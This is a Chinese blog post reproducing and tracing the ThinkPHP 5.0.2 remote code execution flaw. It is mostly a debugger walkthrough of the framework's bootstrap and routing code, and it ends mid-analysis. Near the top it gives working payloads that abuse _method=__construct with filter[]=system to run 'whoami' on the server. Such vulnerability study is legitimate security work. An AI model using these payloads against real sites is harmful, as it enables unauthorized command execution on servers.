{"blogid": "125620298", "writerAge": "码龄3年", "writerBlogNum": "14", "writerCollect": "1", "writerComment": "6", "writerFan": "1", "writerGrade": "2级", "writerIntegral": "150", "writerName": "angelkat", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_125620298.jpg", "writerRankTotal": "95827", "writerRankWeekly": "988709", "writerThumb": "5", "writerVisitNum": "2285", "blog_read_count": "786", "blog_time": "于 2022-07-06 15:58:02 发布", "blog_title": "Thinkphp5.0.2Rce分析", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<blockquote>\n<p>php菜鸟来复现一下thinkphp的rce，如果有什么分析的不对的地方欢迎指正。</p>\n</blockquote>\n<h2>一.环境搭建</h2>\n<blockquote>\n<p>php7.3.4</p>\n<p>apache2.4.39</p>\n</blockquote>\n<p> <img alt=\"\" height=\"349\" src=\"..\\..\\static\\image\\0dddbc899bd74559bb8459ce46d2ac87.png\" width=\"639\"/></p>\n<p></p>\n<p><img alt=\"\" height=\"697\" src=\"..\\..\\static\\image\\04f2ff9d99a1410cb03c81c82716c6c8.png\" width=\"690\"/></p>\n<h2>二、漏洞复现</h2>\n<blockquote>\n<p>poc:</p>\n<p>s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=system</p>\n<p></p>\n<p>aaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system</p>\n<p></p>\n<p>_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoami</p>\n</blockquote>\n<p><img alt=\"\" height=\"1200\" src=\"..\\..\\static\\image\\45db7207186d472a82329e77d829a837.png\" width=\"1200\"/></p>\n<h2>三、漏洞分析</h2>\n<blockquote>\n<p><span style=\"color:#0d0016;\">这里将从最开始分析如何rce的。之前这个</span></p>\n<p></p>\n<p><span style=\"color:#0d0016;\">漏洞没分析过。</span></p>\n<p><span style=\"color:#0d0016;\">使用phpstorm+phpstudy进行debug调试</span></p>\n</blockquote>\n<p></p>\n<blockquote>\n<p></p>\n<p>从index.php开始</p>\n<p>首先定义APP_PATH这个常量为/../application/，就是定义web的路径位置。</p>\n<p>然后包含thinkphp里面的start.php文件，这里就是加载框架引导文件。</p>\n<p></p>\n<p></p>\n</blockquote>\n<p><img alt=\"\" height=\"1200\" src=\"..\\..\\static\\image\\e46bc65ee51a4c3f987a19784a1ac837.png\" width=\"1200\"/></p>\n<blockquote>\n<p>让我们来看看 start.php里面是什么。也很简单的代码，两行代码。</p>\n<p>第一个包含base.php文件，注释也写了是加载基础文件</p>\n</blockquote>\n<p> <img alt=\"\" height=\"1200\" src=\"..\\..\\static\\image\\23265e75a3c44ad8bb41996e1a666a71.png\" width=\"1200\"/></p>\n<blockquote>\n<p>下面看到一大堆define，是定义常量，版本号、路径什么的。这里我们就不一一看了，因为看了也不能记住这么多常量，反正就是定义一大堆常量。ok继续往下，哈哈。</p>\n<p>然后是包含了loader.php，看一下注释，载入loader类。</p>\n</blockquote>\n<p><strong>base.php</strong></p>\n<pre><code class=\"language-php\">&lt;?php\n// +----------------------------------------------------------------------\n// | ThinkPHP [ WE CAN DO IT JUST THINK ]\n// +----------------------------------------------------------------------\n// | Copyright (c) 2006~2016 http://thinkphp.cn All rights reserved.\n// +----------------------------------------------------------------------\n// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )\n// +----------------------------------------------------------------------\n// | Author: liu21st &lt;liu21st@gmail.com&gt;\n// +----------------------------------------------------------------------\n\ndefine('THINK_VERSION', '5.0.2');\ndefine('THINK_START_TIME', microtime(true));\ndefine('THINK_START_MEM', memory_get_usage());\ndefine('EXT', '.php');\ndefine('DS', DIRECTORY_SEPARATOR);\ndefined('THINK_PATH') or define('THINK_PATH', __DIR__ . DS);\ndefine('LIB_PATH', THINK_PATH . 'library' . DS);\ndefine('CORE_PATH', LIB_PATH . 'think' . DS);\ndefine('TRAIT_PATH', LIB_PATH . 'traits' . DS);\ndefined('APP_PATH') or define('APP_PATH', dirname($_SERVER['SCRIPT_FILENAME']) . DS);\ndefined('ROOT_PATH') or define('ROOT_PATH', dirname(realpath(APP_PATH)) . DS);\ndefined('EXTEND_PATH') or define('EXTEND_PATH', ROOT_PATH . 'extend' . DS);\ndefined('VENDOR_PATH') or define('VENDOR_PATH', ROOT_PATH . 'vendor' . DS);\ndefined('RUNTIME_PATH') or define('RUNTIME_PATH', ROOT_PATH . 'runtime' . DS);\ndefined('LOG_PATH') or define('LOG_PATH', RUNTIME_PATH . 'log' . DS);\ndefined('CACHE_PATH') or define('CACHE_PATH', RUNTIME_PATH . 'cache' . DS);\ndefined('TEMP_PATH') or define('TEMP_PATH', RUNTIME_PATH . 'temp' . DS);\ndefined('CONF_PATH') or define('CONF_PATH', APP_PATH); // 配置文件目录\ndefined('CONF_EXT') or define('CONF_EXT', EXT); // 配置文件后缀\ndefined('ENV_PREFIX') or define('ENV_PREFIX', 'PHP_'); // 环境变量的配置前缀\n\n// 环境常量\ndefine('IS_CLI', PHP_SAPI == 'cli' ? true : false);\ndefine('IS_WIN', strpos(PHP_OS, 'WIN') !== false);\n\n// 载入Loader类\nrequire CORE_PATH . 'Loader.php';\n\n// 加载环境变量配置文件\nif (is_file(ROOT_PATH . '.env')) {\n    $env = parse_ini_file(ROOT_PATH . '.env', true);\n    foreach ($env as $key =&gt; $val) {\n        $name = ENV_PREFIX . strtoupper($key);\n        if (is_array($val)) {\n            foreach ($val as $k =&gt; $v) {\n                $item = $name . '_' . strtoupper($k);\n                putenv(\"$item=$v\");\n            }\n        } else {\n            putenv(\"$name=$val\");\n        }\n    }\n}\n\n// 注册自动加载\n\\think\\Loader::register();\n\n// 注册错误和异常处理机制\n\\think\\Error::register();\n\n// 加载惯例配置文件\n\\think\\Config::set(include THINK_PATH . 'convention' . EXT);\n</code></pre>\n<blockquote>\n<p>看看Loader.php文件是什么，一个是Loader类，这里就啥也没干，把这个类加载进去了，就可以创建这个类了。为了文章简短，就不贴代码了。</p>\n</blockquote>\n<p><strong>Loader.php</strong></p>\n<p><img alt=\"\" height=\"752\" src=\"..\\..\\static\\image\\cc4e293d23ff4a7fb0328f3d425a5088.png\" width=\"1200\"/></p>\n<p></p>\n<blockquote>\n<p>接着是加载环境变量配置文件。这里的.env就是本地开发的时候配置文件，为了方便开发人员的一个东西，这边因为我们没有这个文件，所以就没有进入里面，不过和我们分析这个也没有什么关系。</p>\n</blockquote>\n<p><img alt=\"\" height=\"552\" src=\"..\\..\\static\\image\\1c0cf348efdf4c69ac7701d1e32f96b4.png\" width=\"1200\"/></p>\n<blockquote>\n<p>接着就是注册自动加载了，我们刚刚知道他是加载了Loader类的，是在think命令空间下面。</p>\n<p>那\\think\\Loader::register()的意思就是调用think命名空间下Loader类的静态register方法。</p>\n</blockquote>\n<p><img alt=\"\" height=\"504\" src=\"..\\..\\static\\image\\3fafb57891344522b0a8c4d93db1c7ed.png\" width=\"1119\"/></p>\n<blockquote>\n<p>下面是这个函数，我们分析一下做了什么。先看传参，注意前面是没有传参的，也就是这里的$autoload是默认为空。</p>\n<p>接着就是使用spl_auto_register注册一个系统自动加载。</p>\n<p>接着就是注册命令空间定义。</p>\n<p>后面就是加载文件，检测存在不存在，不存在跳过，存在的话就进行加载。</p>\n<p>这里没必要去仔细研究里面是如何记载的。</p>\n</blockquote>\n<pre><code class=\"language-php\"> public static function register($autoload = '')\n    {\n        // 注册系统自动加载\n        spl_autoload_register($autoload ?: 'think\\\\Loader::autoload', true, true);\n        // 注册命名空间定义\n        self::addNamespace([\n            'think'    =&gt; LIB_PATH . 'think' . DS,\n            'behavior' =&gt; LIB_PATH . 'behavior' . DS,\n            'traits'   =&gt; LIB_PATH . 'traits' . DS,\n        ]);\n        // 加载类库映射文件\n        if (is_file(RUNTIME_PATH . 'classmap' . EXT)) {\n            self::addClassMap(__include_file(RUNTIME_PATH . 'classmap' . EXT));\n        }\n\n        // Composer自动加载支持\n        if (is_dir(VENDOR_PATH . 'composer')) {\n            self::registerComposerLoader();\n        }\n\n        // 自动加载extend目录\n        self::$fallbackDirsPsr4[] = rtrim(EXTEND_PATH, DS);\n    }</code></pre>\n<blockquote>\n<p>下面是注册错误和异常处理机制</p>\n<p>think命令空间下面Error类的register静态方法。</p>\n</blockquote>\n<p><img alt=\"\" height=\"504\" src=\"..\\..\\static\\image\\3fafb57891344522b0a8c4d93db1c7ed.png\" width=\"1119\"/></p>\n<blockquote>\n<p>来看看下一步，直接到了Loader类中的autoload方法，我的理解是那个自动加载生效了。传入的是think\\Error，先检测命名空间别名，因为这里使用的是系统的命名空间，并不是别名，就跳过了。</p>\n</blockquote>\n<pre><code class=\"language-php\"> public static function autoload($class)\n    {\n        // 检测命名空间别名\n        if (!empty(self::$namespaceAlias)) {\n            $namespace = dirname($class);\n            if (isset(self::$namespaceAlias[$namespace])) {\n                $original = self::$namespaceAlias[$namespace] . '\\\\' . basename($class);\n                if (class_exists($original)) {\n                    return class_alias($original, $class, false);\n                }\n            }\n        }\n\n        if ($file = self::findFile($class)) {\n\n            // Win环境严格区分大小写\n            if (IS_WIN &amp;&amp; pathinfo($file, PATHINFO_FILENAME) != pathinfo(realpath($file), PATHINFO_FILENAME)) {\n                return false;\n            }\n\n            __include_file($file);\n            return true;\n        }\n    }\n</code></pre>\n<blockquote>\n<p>看到有一个判断，是否存在该文件，然后进入之后判断是不是win环境，如果是win的话，严格区分大小写。然后就是包含该文件，也就是加载该类，这样做的好处就是把核心类全部放入特定文件夹，然后文件可以直接使用，他会自动记载。ok，return true，往下看。</p>\n</blockquote>\n<p><img alt=\"\" height=\"382\" src=\"..\\..\\static\\image\\aa86584161b44817b0c85b97afc7e4a5.png\" width=\"1200\"/></p>\n<p><img alt=\"\" height=\"142\" src=\"..\\..\\static\\image\\6e0bc1275da24d9a9308dd7bec9fb9bc.png\" width=\"552\"/></p>\n<blockquote>\n<p>我们刚刚讲到了，是调用Error类的register方法，他自动加载了该类，然后调用该方法，我们看看里面是什么。</p>\n<p>error_reporting() 函数规定报告哪个错误。</p>\n<p>set_error_handler() 函数设置用户自定义的错误处理函数。</p>\n<p>set_exception_handler() 函数设置用户自定义的异常处理函数。</p>\n<p>register_shutdown_function该函数是来注册⼀个会在PHP中⽌时执⾏的函数。</p>\n</blockquote>\n<p><img alt=\"\" height=\"1200\" src=\"..\\..\\static\\image\\a4a0bf2a7dd74712a27f38fc12fa2a11.png\" width=\"1200\"/></p>\n<blockquote>\n<p>接着记载完注册错误和异常处理机制之后就是 加载惯例配置文件。<br/> 经过了前面的分析，那我们可以知道下面的代码是调用了think命名空间下面的Config类的静态方法set方法。他会先加载Config这个类，然后调用set方法。</p>\n</blockquote>\n<p> <img alt=\"\" height=\"516\" src=\"..\\..\\static\\image\\39db8ffe487b473e98353a79d83a1f94.png\" width=\"1200\"/></p>\n<blockquote>\n<p>接着来看看。包含convention文件，里面是return一个数组，那么传入的就是一个数组。</p>\n</blockquote>\n<p><img alt=\"\" height=\"841\" src=\"..\\..\\static\\image\\2a700cc51e014ec28799e304b966dc72.png\" width=\"1200\"/></p>\n<p></p>\n<p><img alt=\"\" height=\"1061\" src=\"..\\..\\static\\image\\0fe7c402fe3f4f91affcb68206f276d3.png\" width=\"1200\"/></p>\n<pre><code class=\"language-php\"> public static function set($name, $value = null, $range = '')\n    {\n        $range = $range ?: self::$range;\n        if (!isset(self::$config[$range])) {\n            self::$config[$range] = [];\n        }\n        if (is_string($name)) {\n            if (!strpos($name, '.')) {\n                self::$config[$range][strtolower($name)] = $value;\n            } else {\n                // 二维数组设置和获取支持\n                $name                                                 = explode('.', $name);\n                self::$config[$range][strtolower($name[0])][$name[1]] = $value;\n            }\n            return;\n        } elseif (is_array($name)) {\n            // 批量设置\n            if (!empty($value)) {\n                self::$config[$range][$value] = isset(self::$config[$range][$value]) ?\n                array_merge(self::$config[$range][$value], $name) :\n                self::$config[$range][$value] = $name;\n                return self::$config[$range][$value];\n            } else {\n                return self::$config[$range] = array_merge(self::$config[$range], array_change_key_case($name));\n            }\n        } else {\n            // 为空直接返回 已有配置\n            return self::$config[$range];\n        }\n    }</code></pre>\n<blockquote>\n<p>将$range赋值为self::$range，也就是_sys_</p>\n<p>然后判断是否不存在_sys_这个变量，从我们传过来的数组里面，也就是那个convention.php文件里面判断，然后不存在就设置为空，注意这边是一个数组。</p>\n<p>接着判断convention.php返回的结果是不是string类型，如果是的话就判断是否存在.，如果不存在就将其小写，然后写入到config[_sys_]数组中去，值为null。如果有点的话，就以分割，然后存储为二维数组。接着判断是否$name是否为数组，</p>\n</blockquote>\n<p><img alt=\"\" height=\"610\" src=\"..\\..\\static\\image\\9741fd9b2d3d4cfd9f129e4925762ff1.png\" width=\"984\"/></p>\n<blockquote>\n<p>如果不是字符串是数组的话，就先判断是不是空数组，不是的话就将其中的值放入config中，这是Config类中的config变量。设置他的值，所以我们可以知道，配置文件就是convention.php文件，因为他会从这里加载配置，ok。继续往下，有个注释，如果返回的值为空的话，就直接返回，$range为空。 </p>\n</blockquote>\n<p><img alt=\"\" height=\"637\" src=\"..\\..\\static\\image\\99b6a57290d74fc584d33210c9d813e3.png\" width=\"1200\"/></p>\n<blockquote>\n<p> 然后回到start.php，我们回忆一下base.php里面做了什么，加载了许多常量，然后自动加载类，然后错误和异常处理机制，然后加载配置文件。</p>\n<p>接着就是App::run()-&gt;send(),有些人看到这个可能有点害怕，这啥呀这是，不懂，没事，我们一步一步来分析，App::run()这种是不是常见，就是调用App的静态run方法，没有加命令空间罢了。然后-&gt;send()是啥意思，我们先调试看看前面第一步先干嘛。</p>\n</blockquote>\n<p> <img alt=\"\" height=\"790\" src=\"..\\..\\static\\image\\1f037377f13741f1933d13803ffe6c88.png\" width=\"1200\"/></p>\n<blockquote>\n<p> 第一步不出意外，加载这个App类。</p>\n</blockquote>\n<p><img alt=\"\" height=\"491\" src=\"..\\..\\static\\image\\d100a2400e88424c939ca05a564dfc27.png\" width=\"1198\"/></p>\n<blockquote>\n<p>然后调用run方法，也不出意外。传入的参数为空，第一行，先判断$request是不是空，为空的话就调用Request类中的instance方法，得到的结果赋值给$request。不出意外的话就是自动记载Request类了，这边就直接跳了，直接看instance方法。</p>\n</blockquote>\n<p><img alt=\"\" height=\"635\" src=\"..\\..\\static\\image\\d97098f26eff4a5e92c9cf746f815737.png\" width=\"1200\"/></p>\n<blockquote>\n<p> 判断自己这个类的$instance 是不是空，看到下面的调试，他是为空的，那就创建一个static对象给他，也就意味着，$instance是一个static类，不出意外的话，他会自动加载这个static类，这里也不演示了。 </p>\n</blockquote>\n<p><img alt=\"\" height=\"307\" src=\"..\\..\\static\\image\\a120387a46804d778b36ead9fcecedf3.png\" width=\"931\"/></p>\n<p><img alt=\"\" height=\"1017\" src=\"..\\..\\static\\image\\41cea40e2c5b42159e81d6008919dd2d.png\" width=\"1200\"/></p>\n<blockquote>\n<p> 虽然不演示他的自动加载，但是他是创建一个类，会调用里面的__construct方法，这边我们分析一下干了啥。传入的参数是空，所以第一个循环就没进去了，然后判断filter是不是空，当然应该也是空，那么就调用配置文件的get方法来获取这个default_filter参数。那到底是不是获取配置文件的这个参数呢，我们来分析分析get方法就好了</p>\n</blockquote>\n<p><img alt=\"\" height=\"618\" src=\"..\\..\\static\\image\\eb0704afe76c4fdbabcd7f4fe29a6b36.png\" width=\"1166\"/></p>\n<blockquote>\n<p> 传入的参数为default_filter，第二个参数为空，先将config类中的$range赋值给$range，前面分析了是_sys_，然后判断$name，也就是我们第一个参数，是不是空，并且config[_sys_]这个参数是不是存在，如果存在这个参数，并且$name 为空的话，就直接返回该参数。</p>\n<p>要注意的是config这数组变量里面的_sys_键里面存放了所有的配置。</p>\n<p>接着是不是存在点，不存在的话就将$name小写，也就是 default_filter小写，还是default_filter。如果$config[\"_sys_\"][\"default_filter\"]这个存在就返回该变量，否则就返回空。那如果$name是存在点的呢，就以点进行分割，然后小写，形成多维数组，然后再在里面找，之前创建config参数的时候也有这个参数，就是找对应的参数罢了，然后retrue出来</p>\n<p>可以看到和我们想的是一样的，就是从配置里面获取对应的参数。</p>\n</blockquote>\n<p><img alt=\"\" height=\"660\" src=\"..\\..\\static\\image\\1933bc1372bb4cb99b4a415028a8dd1c.png\" width=\"1200\"/></p>\n<p><img alt=\"\" height=\"519\" src=\"..\\..\\static\\image\\f97eb611273a4bea8aaf292137996f70.png\" width=\"1200\"/></p>\n<p></p>\n<blockquote>\n<p>我们接着看，赋值给filter之后，从输入流中获取值，然后给input参数，我们看下面的图，就是 获取post的值。</p>\n</blockquote>\n<p><img alt=\"\" height=\"618\" src=\"..\\..\\static\\image\\eb0704afe76c4fdbabcd7f4fe29a6b36.png\" width=\"1166\"/></p>\n<p><img alt=\"\" height=\"926\" src=\"..\\..\\static\\image\\57c3e9b0c405467b92296c2f8fd76992.png\" width=\"1200\"/></p>\n<p></p>\n<p><img alt=\"\" height=\"716\" src=\"..\\..\\static\\image\\dc0a08dc88a84d259621caa66a4da63c.png\" width=\"1200\"/></p>\n<blockquote>\n<p> 接着就是return这个$instance 这个参数是一个static类，这个类里面比较重要的一个参数就是input，是post的值，那么注意到static类，但是他调用的是Request的__construct方法，这里不是很懂。难道是static就是调用本身这个类，有空我去试试。这里接着往下分析。</p>\n</blockquote>\n<p><img alt=\"\" height=\"427\" src=\"..\\..\\static\\image\\ae6bc6da81f0436792ea6a210b381937.png\" width=\"1200\"/></p>\n<blockquote>\n<p> 接着我们回到了App的run方法，他创建了一个$request变量，这是一个Request类，然后里面的参数input是post的值，重要的事多说几遍。 接着就是调用本身类中的initCommon函数。</p>\n</blockquote>\n<p><img alt=\"\" height=\"756\" src=\"..\\..\\static\\image\\83e2374236d14fcdbc517f8cd1d4fa3f.png\" width=\"1200\"/></p>\n<blockquote>\n<p>我们来看看这个initConmmon函数，先判断self::$init是不是为空</p>\n<p>，可以看到为false，不为空，然后调用init函数。那我们先暂停，看看init函数。 </p>\n</blockquote>\n<p><img alt=\"\" height=\"510\" src=\"..\\..\\static\\image\\2f70d6f83e904157b561b8a30013d68d.png\" width=\"1200\"/></p>\n<p><img alt=\"\" height=\"497\" src=\"..\\..\\static\\image\\7f57c8d5f8cb4bdeb702740308ca1715.png\" width=\"1042\"/></p>\n<blockquote>\n<p>传入的参数为空，然后第一行的$module也为空。判断是不是存在init.php，这个根据调试的结果，是不存在进入了else里面，如果存在就包含这个文件。</p>\n<p>那我们接着看看else里面是啥。获取$path，这里$path就是web路径。</p>\n</blockquote>\n<p><img alt=\"\" height=\"962\" src=\"..\\..\\static\\image\\da943502657748b49825fbd1c6d55510.png\" width=\"1200\"/></p>\n<p></p>\n<blockquote>\n<p> 然后调用Config类中的load方法。</p>\n</blockquote>\n<p> <img alt=\"\" height=\"610\" src=\"..\\..\\static\\image\\035e4515d73341c2a070301ee35b385e.png\" width=\"1200\"/></p>\n<blockquote>\n<p> 通过debug可以看到传入的值为：D:\\PHPSTUDY\\thinkphp\\think-5.0.2\\public/../application/config.php</p>\n<p>然后继续获取$range</p>\n<p>然后判断这个config.php文件是不是存在。分析他的拓展名，很明显是php</p>\n<p>是php的话就调用本身的set方法。之前是分析过set方法的。这里就不分析了。</p>\n</blockquote>\n<p><img alt=\"\" height=\"614\" src=\"..\\..\\static\\image\\37b26190d1fc43748e1a04f1acd0ff11.png\" width=\"1200\"/></p>\n<blockquote>\n<p>回到init方法，根据前面的分析，可以知道接着加载数据库的配置。</p>\n<p>然后判断拓展的目录是不是存在，这里是不存在。</p>\n</blockquote>\n<p><img alt=\"\" height=\"610\" src=\"..\\..\\static\\image\\035e4515d73341c2a070301ee35b385e.png\" width=\"1200\"/></p>\n<p></p>\n<blockquote>\n<p>然后加载应用状态配置。</p>\n<p>加载行为扩展文件自动加载加载Hook类，然后调用import函数，这里的拓展就不看了。</p>\n<p>加载公共文件</p>\n<p>加载当前模块语言包</p>\n</blockquote>\n<p><img alt=\"\" height=\"633\" src=\"..\\..\\static\\image\\21d615eef97b4e47bf8e60a798d7b7c2.png\" width=\"1200\"/></p>\n<p></p>\n<blockquote>\n<p> 最后调用Config中的get方法。这个方法也有分析过。当参数为空时，就返回config[\"_sys_\"]这一整数组。</p>\n</blockquote>\n<p><img alt=\"\" height=\"422\" src=\"..\\..\\static\\image\\2527523bc9a44c2cb9fb2f3fd17b98a8.png\" width=\"1200\"/></p>\n<blockquote>\n<p> 好的，接下来继续分析initCommon这个函数，前面先init初始化了一下。返回的结果是config[\"_sys_\"]。然后将配置变量里面的class_suffix赋值给suffix变量。这一整步就是初始化应用。下面是应用调试模式。</p>\n</blockquote>\n<p><img alt=\"\" height=\"1200\" src=\"..\\..\\static\\image\\9f975e3feb6b49f698ede96e3d8ca33e.png\" width=\"1200\"/></p>\n<blockquote>\n<p> 调用Env类中的get方法，第一个参数是app_debug，第二个参数是Config::get('app_debug'),第二个参数我们分析过了，是从配置文件中获取app_debug，这个值，我们来看看Env这个类中的get方法是干嘛的。</p>\n</blockquote>\n<p><img alt=\"\" height=\"507\" src=\"..\\..\\static\\image\\9a450f10d9b946f7a2fc9a0f0c8e1f1c.png\" width=\"1200\"/></p>\n<blockquote>\n<p>可以看到$name是app_debug,然后$default是true，说明配置文件中的app_debug为true，然后第一行代码，先将.替换为_，那app_debug就不变了。strtoupper是将字符串大写，因为常量一般都是大写的，环境变量也是，这是一种规范，我们看到下面那张图，ENV_PREFIX是环境变量的前缀，getenv就是获取环境变量，那就是获取PHP_APP_DEBUG的值，不是false就return $result,否则就是return $defaule那个环境变量应该就是.env里面设置，我们可以看到.env文件设置优先级高。然后才是返回配置文件的。</p>\n</blockquote>\n<p><img alt=\"\" height=\"807\" src=\"..\\..\\static\\image\\6ada7cec296640809a0e71cae6c170e5.png\" width=\"1200\"/></p>\n<p> <img alt=\"\" height=\"129\" src=\"..\\..\\static\\image\\260d24dacba14120bd15847842c7d07e.png\" width=\"1139\"/></p>\n<blockquote>\n<p>可以看到获取app_debug的值赋值给self::$debug变量,然后判断为false就把报错关了，否则就申请一个比较大的buffer。这里申请缓冲区我不懂。</p>\n</blockquote>\n<p><img alt=\"\" height=\"507\" src=\"..\\..\\static\\image\\9a450f10d9b946f7a2fc9a0f0c8e1f1c.png\" width=\"1200\"/></p>\n<blockquote>\n<p>接着就是 注册应用命名空间，从$config变量中获取app_namespace的值赋值给self::namespace，然后添加命名空间，后面就是如果根命名空间为空就从$config中拿根命名空间。</p>\n</blockquote>\n<p><img alt=\"\" height=\"281\" src=\"..\\..\\static\\image\\6db109b529bf4da981f15b20e9a3ce9b.png\" width=\"1200\"/></p>\n<blockquote>\n<p>加载 额外文件，直接看代码吧，判断配置文件中的extra_file_list是不是为空，不为空的话就包含这些文件。然后把$file[\"这里面填的是额外文件的名字\"]设置为true。</p>\n<p> </p>\n</blockquote>\n<p><img alt=\"\" height=\"577\" src=\"..\\..\\static\\image\\af1321bd5654459387eb1f60f08d168e.png\" width=\"1200\"/></p>\n<blockquote>\n<p>然后设置系统时区，然后监听app_init。分析一下监听app_init是啥吧。</p>\n</blockquote>\n<p><img alt=\"\" height=\"767\" src=\"..\\..\\static\\image\\066068bb2ed94b3399c0eb5dc1e058b3.png\" width=\"1200\"/></p>\n<blockquote>\n<p>传入的参数是app_init。看到这个static就类似于$this吧，emmm然后调用Hook类中的get方法。</p>\n<p> </p>\n</blockquote>\n<p><img alt=\"\" height=\"732\" src=\"..\\..\\static\\image\\4ee6df37157d4ee295a8b61985a7e4c6.png\" width=\"1200\"/></p>\n<blockquote>\n<p><em>array_key_exists</em>() 函数判断某个数组中是否存在指定的 key，如果该 key 存在，则返回 true，否则返回 false。</p>\n<p>判断self::$tags是不是存在app_init，存在的话就返回self::$tags[app_init]，否则返回空数组。看上面的图，$tags是本类中$tags变量键名为app_init的键值。然后对其进行数组遍历，调用自身的exec方法，传入的参数最后两个为空。前两个就是$tags的键名和键值，套了好多层。看看exec方法。</p>\n</blockquote>\n<p><img alt=\"\" height=\"745\" src=\"..\\..\\static\\image\\40e2f4fbcf5a4ac8a3ec4fe74355c26c.png\" width=\"1200\"/></p>\n<p></p>\n<blockquote>\n<p> 来看看exec里面是什么。先判断APP::$debug是不是true，为true才调用Debug类中的remark方法。这里就是开没开器debug的关键。又得看看remark方法了，我这边贴在下面，继续在这说了，注释是记录时间和内存使用，传入的第一个$name是behavior_start，第一个参数$value是time,然后判断$value是不是float类型，显然不是，然后就microtime(true);</p>\n<p>赋值给self::$info[\"behavior_start\"]</p>\n<p>如果$value不是time，就继续赋值，看完之后，算了不管了，就如注释所说，把时间和内存使用存储一下。接着分析， <em>is_callable</em>() 函数用于检测函数在当前环境中是否可调用，这里呢就是检查他是不是可以执行的函数，然后执行命令，然后判断是不是object，里面是一样的功能，最后记录一下运行的时间，然后记录到日志中去。返回里面执行命令的结果，这里的值都不能改变，所以就不多看了。</p>\n</blockquote>\n<p><img alt=\"\" height=\"768\" src=\"..\\..\\static\\image\\881e1c58e0cf414291b55cb389160658.png\" width=\"1200\"/></p>\n<p><img alt=\"\" height=\"410\" src=\"..\\..\\static\\image\\550654efda7843ab94f931673fac005c.png\" width=\"1200\"/></p>\n<blockquote>\n<p>exec就看完了，我们接着看，$results[$key]为执行命令的结果，如果执行成功了，就返回结果，否则就break。中断行为执行。</p>\n</blockquote>\n<p><img alt=\"\" height=\"732\" src=\"..\\..\\static\\image\\4ee6df37157d4ee295a8b61985a7e4c6.png\" width=\"1200\"/></p>\n<blockquote>\n<p>那这边就结束了，把$config赋值给self::$init,然后返回，这是initCommon函数，</p>\n</blockquote>\n<p><img alt=\"\" height=\"767\" src=\"..\\..\\static\\image\\066068bb2ed94b3399c0eb5dc1e058b3.png\" width=\"1200\"/></p>\n<p></p>\n<blockquote>\n<p> 回到run方法。返回了配置信息，那个$config还是配置信息，然后判断BIND_MODULE是否定义，这边debug跳过去了，。 </p>\n</blockquote>\n<p><img alt=\"\" height=\"779\" src=\"..\\..\\static\\image\\a340e4ad4ab74f5bbb4460b237c70e43.png\" width=\"1200\"/></p>\n<blockquote>\n<p>然后是检查多语言机制，否则读取默认语言。接着加载语言包。</p>\n</blockquote>\n<p><img alt=\"\" height=\"547\" src=\"..\\..\\static\\image\\07c17c17cf1942359cb2371805b28f2b.png\" width=\"1200\"/></p>\n<blockquote>\n<p> 获取调度信息，如果dispatch为空的话，就调用routeCheck方法，第一个参数为Request类，第二个参数为配置信息</p>\n<p>那我们接着分析一下他是如何进行路由检测的。 </p>\n</blockquote>\n<p><img alt=\"\" height=\"643\" src=\"..\\..\\static\\image\\b5f1bdbb5b2748e98841ed498cc39971.png\" width=\"1200\"/></p>\n<p><img alt=\"\" height=\"1200\" src=\"..\\..\\static\\image\\50ffb9888c824c0faaa93d532447b226.png\" width=\"1200\"/></p>\n<p></p>\n<blockquote>\n<p> 我们又从run方法跑到了routeCheck方法，然后第一行看到request类的path方法，继续先分析path方法。</p>\n</blockquote>\n<p><img alt=\"\" height=\"744\" src=\"..\\..\\static\\image\\254263cce3d34887be807cac16626bb2.png\" width=\"1200\"/></p>\n<blockquote>\n<p> 判断$this-&gt;path是不是空，为空的话从配置文件中获取url_html_suffix，然后赋值给$suffix，然后调用pathinfo方法。我们又从path方法跳到pathinfo方法。那就一个一个来吧。不能急。</p>\n</blockquote>\n<p><img alt=\"\" height=\"737\" src=\"..\\..\\static\\image\\30e830664aa14aa28473860d5d515884.png\" width=\"1200\"/></p>\n<p></p>\n<blockquote>\n<p> 判断$this-&gt;pathinfo是不是空，判断配置文件var_pathinfo的值，有没有这个变量，这里是字符s。存在s这个变量的话，就将s的值赋值给$_SERVER['PATH_INFO']，然后把_GET数组中s这个变量unset掉。</p>\n</blockquote>\n<p><img alt=\"\" height=\"824\" src=\"..\\..\\static\\image\\02b8b6969bfd4c539504eaa6ffb18145.png\" width=\"1200\"/></p>\n<blockquote>\n<p> 然后分析这个pathinfo的信息，然后返回pathinfo，这里就是检查?s的路由方式，然后我们debug的时候什么也没有，所以就为“/”。</p>\n</blockquote>\n<p><img alt=\"\" height=\"773\" src=\"..\\..\\static\\image\\8fe760e2dc30458988b71a159ef06482.png\" width=\"1200\"/></p>\n<blockquote>\n<p>回到path函数，得到pathinfo为“\\”，然后进入去掉正常的url后缀这一行，这里大概就是后缀是html，伪静态访问，最后一个else写了就是什么后缀都可以，第如果设置为fasle，就是禁止伪静态访问了。然后返回return $this-&gt;path;</p>\n</blockquote>\n<p><img alt=\"\" height=\"737\" src=\"..\\..\\static\\image\\30e830664aa14aa28473860d5d515884.png\" width=\"1200\"/></p>\n<blockquote>\n<p>然后回到routeCheck这个函数，我们知道path获取了路径信息，然后从配置信息中找到pathinfo_depr，他的值为“/”，然后把$result设置为false。$check为true，包含route.php，接着判断$rules为数组不，然后就进入else了。</p>\n<p> </p>\n</blockquote>\n<p><img alt=\"\" height=\"744\" src=\"..\\..\\static\\image\\254263cce3d34887be807cac16626bb2.png\" width=\"1200\"/></p>\n<blockquote>\n<p>配置信息中获取route_config_file，他是一个数组，里面一个参数为route。然后包含route.php，返回一个数组，然后调用Route类的import方法。</p>\n<p> 检查各种规则，然后注册规则。导入路由配置。</p>\n</blockquote>\n<p><img alt=\"\" height=\"422\" src=\"..\\..\\static\\image\\5e91bfe7d4164336808196fd20fcc73c.png\" width=\"1200\"/></p>\n<p><img alt=\"\" height=\"762\" src=\"..\\..\\static\\image\\a676d1e1e0374b13bafadd4591a25093.png\" width=\"1200\"/></p>\n<blockquote>\n<p> 接着调用Route类的check方法。</p>\n</blockquote>\n<p><img alt=\"\" height=\"604\" src=\"..\\..\\static\\image\\2fb64c29f3ee4f7192a2e0ecb474dc45.png\" 